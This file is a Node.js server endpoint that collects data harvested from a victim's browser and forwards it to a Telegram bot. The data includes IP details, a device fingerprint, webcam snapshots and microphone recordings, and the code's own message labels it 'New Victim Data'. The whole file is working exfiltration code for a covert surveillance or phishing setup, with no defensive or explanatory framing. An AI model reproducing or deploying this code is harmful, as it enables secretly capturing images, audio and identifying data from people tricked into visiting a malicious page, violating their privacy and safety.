// api/collect.js
const axios = require('axios');
const FormData = require('form-data');

module.exports = async (req, res) => {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Read environment variables
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
        console.error('Missing Telegram credentials');
        return res.status(500).json({ error: 'Server misconfigured' });
    }

    const { ipData, fingerprint, webcam, mic, timestamp } = req.body;

    console.log(`[+] Received data at ${timestamp}`);
    console.log(`[+] IP: ${ipData?.ip || 'N/A'}`);
    console.log(`[+] Webcam: ${webcam ? 'yes' : 'no'}, Mic: ${mic ? 'yes' : 'no'}`);

    // --- 1. Send text message with IP & fingerprint ---
    let message = '📡 *New Victim Data*\n\n';
    message += `*IP Info:*\n${JSON.stringify(ipData, null, 2)}\n\n`;
    message += `*Fingerprint:*\n${JSON.stringify(fingerprint, null, 2)}\n\n`;
    message += `*Timestamp:* ${timestamp}`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('[+] Text message sent.');
    } catch (e) {
        console.error('❌ Text send failed:', e.response?.data || e.message);
        // Continue anyway
    }

    // --- 2. Send webcam photo (if present) ---
    if (webcam) {
        try {
            const base64Data = webcam.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', buffer, { filename: 'webcam.jpg', contentType: 'image/jpeg' });

            await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
            console.log('[+] Photo sent.');
        } catch (e) {
            console.error('❌ Photo send failed:', e.response?.data || e.message);
        }
    }

    // --- 3. Send microphone audio (if present) ---
    if (mic) {
        try {
            const base64Data = mic.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('audio', buffer, { filename: 'mic.wav', contentType: 'audio/wav' });

            await axios.post(`https://api.telegram.org/bot${token}/sendAudio`, form, {
                headers: form.getHeaders()
            });
            console.log('[+] Audio sent.');
        } catch (e) {
            console.error('❌ Audio send failed:', e.response?.data || e.message);
        }
    }

    return res.status(200).json({ success: true });
};